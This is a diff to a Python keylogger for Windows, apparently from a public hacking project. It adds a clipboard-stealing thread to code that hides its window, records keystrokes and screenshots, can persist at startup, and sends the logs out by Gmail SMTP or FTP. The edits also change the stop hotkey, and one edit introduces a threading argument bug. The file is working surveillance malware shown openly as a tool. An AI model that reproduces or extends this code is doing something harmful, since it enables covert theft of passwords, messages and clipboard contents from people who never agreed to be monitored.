@@ -9,7 +9,7 @@ NOTE: This program must be used for legal purposes only! I am not responsible fo
 '''
 
 import smtplib, time, os, threading, sys
-import win32console, win32gui, win32event, win32api, winerror
+import win32console, win32gui, win32event, win32api, winerror, win32clipboard
 from sys import exit; from ftplib import FTP; from urllib2 import urlopen; from shutil import copyfile
 from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
 try:
@@ -44,6 +44,8 @@ intScrTime = 120  # set time for taking screen in seconds
 
 blnLogClick = "False"  # for logging window clicks
 blnAddToStartup = "False"
+
+blnLogClipboard = "False"
 
 
 def hide():
@@ -86,8 +88,34 @@ if blnAddToStartup == "True":
     AddToStartup()
 
 blnFirstSend = "True"
-blnStop = "False"
 intLogChars = 0
+
+
+def MonitorClipboard():  # Function to get clipboard data
+    global strLogs
+
+    try:  # check to see if variable is defined
+        strLogs
+    except NameError:
+        strLogs = ""
+
+    strClipDataOld = ""
+
+    while True:
+        win32clipboard.OpenClipboard()  # open clipboard
+        strClipData = win32clipboard.GetClipboardData()  # get data
+        win32clipboard.CloseClipboard()
+
+        if strClipData != strClipDataOld:
+            strLogs += "\n" + "\n" + "* * * * * * Clipboard * * * * * *" + "\n" + strClipData + "\n" + \
+                       "* * * * * * Clipboard * * * * * *" + "\n" + "\n"
+            strClipDataOld = strClipData
+        time.sleep(1)  # check every second
+
+if blnLogClipboard == "True":  # if the user wants to capture clipboard data
+    ClipboardThread = threading.Thread(target=MonitorClipboard)
+    ClipboardThread.daemon = True
+    ClipboardThread.start()
 
 
 def OnKeyboardEvent(event):
@@ -97,20 +125,17 @@ def OnKeyboardEvent(event):
     except NameError:
         strLogs = ""
 
-    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop, strExIP):
+    def SendMessages(strLogs, strEmailAc, strEmailPass, strExIP):
         global blnFirstSend  # easier to just define this variable to be global within the functions
         try:
-            if blnStop == "True":
-                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
-                strMessage = strDateTime + "\n\n" + strLogs
-            elif blnFirstSend == "True":
+            if blnFirstSend == "True":
                 strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                 strMessage = strDateTime + "\n\n" + strLogs
                 blnFirstSend = "False"
             else:
                 strMessage = strLogs
 
-            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From "+strExIP, strMessage)
+            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From " +strExIP, strMessage)
 
             SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
             SmtpServer.ehlo()   # identifies you to the smtp server
@@ -119,9 +144,9 @@ def OnKeyboardEvent(event):
             SmtpServer.close()
         except:
             time.sleep(10)  # if the email cannot be sent, try again every 10 seconds
-            SendMessages(strLogs, strEmailAc, strEmailPass, blnStop, strExIP)
+            SendMessages(strLogs, strEmailAc, strEmailPass, strExIP)
 
-    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop):
+    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath):
         global blnFirstSend
         try:
             ftp = FTP(); ftp.connect(strFtpServer, 21)
@@ -130,9 +155,7 @@ def OnKeyboardEvent(event):
 
             TMP = os.environ["TEMP"]
             objLogFile = open(TMP + "/log.txt", 'w')
-            if blnStop == "True":
-                objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
-            elif blnFirstSend == "True":
+            if blnFirstSend == "True":
                 objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
                 blnFirstSend = "False"
             objLogFile.write(strLogs)
@@ -148,18 +171,16 @@ def OnKeyboardEvent(event):
             objLogFile = open(TMP + "/log.txt", 'w'); objLogFile.close()  # delete log file contents
         except:
             time.sleep(10)  # if messages cannot be sent, try again every 10 seconds
-            SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop)
+            SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath)
 
-    def StoreMessagesLocal(strLogs, blnStop):
+    def StoreMessagesLocal(strLogs):
         global blnFirstSend
         # log keys locally
         if os.path.isfile(strLogFile):
             objLogFile = open(strLogFile, 'a')
         else:
             objLogFile = open(strLogFile, 'w')
-        if blnStop == "True":
-            objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
-        elif blnFirstSend == "True":
+        if blnFirstSend == "True":
             objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
             blnFirstSend = "False"
         objLogFile.write(strLogs)
@@ -168,13 +189,13 @@ def OnKeyboardEvent(event):
     def CreateNewThreadMessages():  # function for creating thread for sending messages
         if not strLogs == "":
             if blnStoreLocal == "True":
-                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, blnStop))
+                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=strLogs)
                 StoreLogThread.start()
             elif blnFTP == "True":
-                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
+                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath))
                 SendFTPThread.start()
             else:
-                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop, strExIP))
+                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, strExIP))
                 SendMailThread.start()
 
     def SendScreen():  # function to send screens (easier to do this as a new function)
@@ -214,18 +235,10 @@ def OnKeyboardEvent(event):
             SendScreenThread = threading.Thread(target=SendScreen)
             SendScreenThread.start()
 
-    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
-        # CTRL-RIGHT_SHIFT-H to stop the program
-        if blnStoreLocal == "True":
-            StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, "True"))
-            StoreLogThread.start()
-        elif blnFTP == "True":
-            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, "True"))
-            SendFTPThread.start()
-        else:
-            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True", strExIP))
-            SendMailThread.start()
-        exit()
+    # ctrl Lshift, rshift, h to stop program
+    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and \
+            GetKeyState(HookConstants.VKeyToID("VK_LSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
+        exit(0)
 
     if event.Ascii == 8:
         strLogs = strLogs + " [Bck] "
@@ -242,6 +255,7 @@ def OnKeyboardEvent(event):
     if blnUseTime == "True":  # if the user is sending messages by timer
         if not objTimer.is_alive():  # check to see if the timer is not active
             objTimer = threading.Timer(intTimePerSend, CreateNewThreadMessages)
+            objTimer.daemon = True
             objTimer.start()
             strLogs = ""; intLogChars = 0
     else:
@@ -252,6 +266,7 @@ def OnKeyboardEvent(event):
     if blnScrShot == "True":  # if the user is capturing screenshots
         if not objTimer2.is_alive():
             objTimer2 = threading.Timer(intScrTime, TakeScr)
+            objTimer2.daemon = True
             objTimer2.start()
 
     return True  # return True to pass key to windows
